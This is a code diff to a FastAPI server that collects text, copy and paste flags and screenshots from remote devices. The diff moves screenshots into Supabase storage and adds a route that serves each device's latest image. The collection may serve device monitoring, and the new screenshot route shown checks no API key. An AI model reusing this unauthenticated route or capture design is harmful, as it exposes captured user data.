@@ -14,7 +14,7 @@ from pathlib import Path
 from typing import Deque, Dict
 
 from fastapi import FastAPI, Header, Request
-from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
+from fastapi.responses import FileResponse, JSONResponse, Response, StreamingResponse
 from pydantic import BaseModel
 import psycopg
 
@@ -27,6 +27,9 @@ devices: Dict[str, Dict[str, object]] = {}
 device_online_states: Dict[str, bool] = {}
 screenshot_requests: Dict[str, int] = {}
 DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
+SUPABASE_URL = os.getenv("SUPABASE_URL", "").strip().rstrip("/")
+SUPABASE_SERVICE_ROLE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY", "").strip()
+SCREENSHOT_BUCKET = "screenshots"
 SERVICE_STARTED_AT = time.time()
 DEVICE_HEARTBEAT_INTERVAL = 30
 DEVICE_OFFLINE_AFTER = 90
@@ -448,7 +451,7 @@ def load_text_messages():
                 with connection.cursor() as cursor:
                     cursor.execute(
                         """
-                        SELECT id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, screenshot_base64, time, is_pasted, is_copied
+                        SELECT id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied
                         FROM messages
                         ORDER BY time DESC
                         LIMIT %s
@@ -466,10 +469,9 @@ def load_text_messages():
                     "device_name": row[5],
                     "app_name": row[6],
                     "source_url": row[7] or "",
-                    "screenshot_base64": row[8] or "",
-                    "time": row[9],
-                    "is_pasted": row[10],
-                    "is_copied": row[11],
+                    "time": row[8],
+                    "is_pasted": row[9],
+                    "is_copied": row[10],
                 }
                 for row in reversed(rows)
             ]
@@ -498,22 +500,19 @@ def load_devices():
             with connection.cursor() as cursor:
                 cursor.execute(
                     """
-                    SELECT device_id, device_name, last_seen, started_at, joined_at,
-                           screenshot_base64, screenshot_time
+                    SELECT device_id, device_name, last_seen, started_at, joined_at
                     FROM devices
                     ORDER BY last_seen DESC
                     """
                 )
                 rows = cursor.fetchall()
-        for device_id, device_name, last_seen, started_at, joined_at, screenshot_base64, screenshot_time in rows:
+        for device_id, device_name, last_seen, started_at, joined_at in rows:
             devices[str(device_id)] = {
                 "id": device_id,
                 "name": device_name,
                 "last_seen": last_seen,
                 "started_at": started_at,
                 "joined_at": joined_at,
-                "screenshot_base64": screenshot_base64 or "",
-                "screenshot_time": screenshot_time,
             }
             device_online_states[str(device_id)] = (
                 int(time.time() * 1000) - int(last_seen)
@@ -534,8 +533,8 @@ def save_message(item):
         with connection.cursor() as cursor:
             cursor.execute(
                 """
-                INSERT INTO messages (id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, screenshot_base64, time, is_pasted, is_copied)
-                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+                INSERT INTO messages (id, text, raw_text, raw_only, device_id, device_name, app_name, source_url, time, is_pasted, is_copied)
+                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                 ON CONFLICT (id) DO NOTHING
                 """,
                 (
@@ -547,7 +546,6 @@ def save_message(item):
                     item["device_name"],
                     item["app_name"],
                     item["source_url"],
-                    item["screenshot_base64"],
                     item["time"],
                     item["is_pasted"],
                     item["is_copied"],
@@ -557,15 +555,12 @@ def save_message(item):
 
 
 def save_device(device_id, device_name, last_seen, started_at, joined_at):
-    existing_device = devices.get(device_id, {})
     devices[device_id] = {
         "id": device_id,
         "name": device_name,
         "last_seen": last_seen,
         "started_at": started_at,
         "joined_at": joined_at,
-        "screenshot_base64": existing_device.get("screenshot_base64", ""),
-        "screenshot_time": existing_device.get("screenshot_time"),
     }
     if not DATABASE_URL:
         return
@@ -574,10 +569,8 @@ def save_device(device_id, device_name, last_seen, started_at, joined_at):
         with connection.cursor() as cursor:
             cursor.execute(
                 """
-                INSERT INTO devices
-                    (device_id, device_name, last_seen, started_at, joined_at,
-                     screenshot_base64, screenshot_time)
-                VALUES (%s, %s, %s, %s, %s, %s, %s)
+                INSERT INTO devices (device_id, device_name, last_seen, started_at, joined_at)
+                VALUES (%s, %s, %s, %s, %s)
                 ON CONFLICT (device_id) DO UPDATE SET
                     device_name = EXCLUDED.device_name,
                     last_seen = EXCLUDED.last_seen,
@@ -589,8 +582,6 @@ def save_device(device_id, device_name, last_seen, started_at, joined_at):
                     last_seen,
                     started_at,
                     joined_at,
-                    existing_device.get("screenshot_base64", ""),
-                    existing_device.get("screenshot_time"),
                 ),
             )
 
@@ -613,7 +604,6 @@ class MessageInput(BaseModel):
     device_name: str = "Unknown device"
     app_name: str = "Unknown app"
     source_url: str = ""
-    screenshot_base64: str = ""
     is_pasted: bool = False
     is_copied: bool = False
     retry: bool = False
@@ -676,6 +666,17 @@ async def fetch_config():
 @app.get("/api/devices")
 async def fetch_devices():
     now = int(time.time() * 1000)
+    screenshot_devices = set()
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(
+                        "SELECT DISTINCT ON (device_id) device_id FROM screenshots ORDER BY device_id, captured_at DESC"
+                    )
+                    screenshot_devices = {str(row[0]) for row in cursor.fetchall()}
+        except Exception as error:
+            print(f"Could not load screenshot list: {error}")
     result = []
     for device in devices.values():
         last_seen = int(device.get("last_seen", 0))
@@ -693,6 +694,11 @@ async def fetch_devices():
                 "last_seen_age_seconds": age_seconds,
                 "offline_after_seconds": DEVICE_OFFLINE_AFTER,
                 "uptime_seconds": max(0, (uptime_end - started_at) // 1000),
+                "screenshot_url": (
+                    f"/api/devices/{device['id']}/screenshot/latest"
+                    if str(device["id"]) in screenshot_devices
+                    else ""
+                ),
             }
         )
     return JSONResponse(result)
@@ -770,28 +776,64 @@ async def upload_device_screenshot(
         return JSONResponse({"ok": False, "error": "invalid screenshot"}, status_code=400)
     if device_id not in devices:
         return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
-    devices[device_id]["screenshot_base64"] = screenshot_base64
-    screenshot_time = int(time.time() * 1000)
-    devices[device_id]["screenshot_time"] = screenshot_time
-    if DATABASE_URL:
-        try:
-            with psycopg.connect(DATABASE_URL) as connection:
-                with connection.cursor() as cursor:
-                    cursor.execute(
-                        """
-                        UPDATE devices
-                        SET screenshot_base64 = %s, screenshot_time = %s
-                        WHERE device_id = %s
-                        """,
-                        (screenshot_base64, screenshot_time, device_id),
-                    )
-        except Exception as error:
-            print(f"Could not save device screenshot: {error}")
-            return JSONResponse(
-                {"ok": False, "error": "screenshot storage unavailable"},
-                status_code=503,
-            )
+    if not DATABASE_URL or not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
+        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
+    try:
+        image_bytes = base64.b64decode(screenshot_base64, validate=True)
+        captured_at = int(time.time() * 1000)
+        storage_path = f"{device_id}/{captured_at}.jpg"
+        storage_request = urllib.request.Request(
+            f"{SUPABASE_URL}/storage/v1/object/{SCREENSHOT_BUCKET}/{storage_path}",
+            data=image_bytes,
+            headers={
+                "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
+                "apikey": SUPABASE_SERVICE_ROLE_KEY,
+                "Content-Type": "image/jpeg",
+                "x-upsert": "false",
+            },
+            method="POST",
+        )
+        with urllib.request.urlopen(storage_request, timeout=30) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"Storage HTTP {response.status}")
+        with psycopg.connect(DATABASE_URL) as connection:
+            with connection.cursor() as cursor:
+                cursor.execute(
+                    "INSERT INTO screenshots (device_id, captured_at, storage_path) VALUES (%s, %s, %s)",
+                    (device_id, captured_at, storage_path),
+                )
+    except (ValueError, HTTPError, urllib.error.URLError, TimeoutError, RuntimeError, psycopg.Error) as error:
+        print(f"Could not save device screenshot: {error}")
+        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
     return JSONResponse({"ok": True})
+
+
+@app.get("/api/devices/{device_id}/screenshot/latest")
+async def fetch_latest_device_screenshot(device_id: str):
+    if not DATABASE_URL or not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
+        return JSONResponse({"ok": False, "error": "screenshot storage unavailable"}, status_code=503)
+    try:
+        with psycopg.connect(DATABASE_URL) as connection:
+            with connection.cursor() as cursor:
+                cursor.execute(
+                    "SELECT storage_path FROM screenshots WHERE device_id = %s ORDER BY captured_at DESC LIMIT 1",
+                    (device_id.strip(),),
+                )
+                row = cursor.fetchone()
+        if not row:
+            return JSONResponse({"ok": False, "error": "screenshot not found"}, status_code=404)
+        storage_request = urllib.request.Request(
+            f"{SUPABASE_URL}/storage/v1/object/{SCREENSHOT_BUCKET}/{row[0]}",
+            headers={
+                "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE_KEY}",
+                "apikey": SUPABASE_SERVICE_ROLE_KEY,
+            },
+        )
+        with urllib.request.urlopen(storage_request, timeout=30) as response:
+            return Response(response.read(), media_type="image/jpeg")
+    except (HTTPError, urllib.error.URLError, TimeoutError, psycopg.Error) as error:
+        print(f"Could not load device screenshot: {error}")
+        return JSONResponse({"ok": False, "error": "screenshot unavailable"}, status_code=503)
 
 
 @app.post("/api/devices/offline")
@@ -835,7 +877,6 @@ async def add_message(payload: MessageInput, x_api_key: str | None = Header(defa
     device_name = payload.device_name.strip() or "Unknown device"
     app_name = payload.app_name.strip() or "Unknown app"
     source_url = payload.source_url.strip()
-    screenshot_base64 = payload.screenshot_base64.strip()
     is_pasted = payload.is_pasted
     is_copied = payload.is_copied
     raw_text = payload.raw_text.strip() or text
@@ -858,7 +899,6 @@ async def add_message(payload: MessageInput, x_api_key: str | None = Header(defa
         "device_name": device_name,
         "app_name": app_name,
         "source_url": source_url,
-        "screenshot_base64": screenshot_base64,
         "is_pasted": is_pasted,
         "is_copied": is_copied,
     }
